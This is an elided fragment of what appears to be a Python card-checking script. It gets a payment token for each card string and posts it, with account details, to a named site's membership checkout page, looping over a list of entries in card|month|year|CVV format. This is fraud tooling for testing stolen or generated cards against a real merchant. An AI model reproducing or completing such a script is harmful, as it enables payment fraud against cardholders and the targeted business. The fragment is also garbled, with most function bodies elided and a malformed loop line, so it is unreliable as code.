...
def get_token(ccs):
 ...
 try:
  ...
  return r.text
def mainchk(pm,ccs,email,passs,user,cardtype):
 ...
 r = requests.post("https://constructiontest.co.uk/membership-checkout/?level=5",data=p,headers=h)
...
#passwords = ["4076370000325132|12|2029|974"]
i=0
for cc in passwords:7
  pm = (get_token(cc))
  print(cc)
  ...
  mainchk(pm,cc,email,passs,user,cardtype)
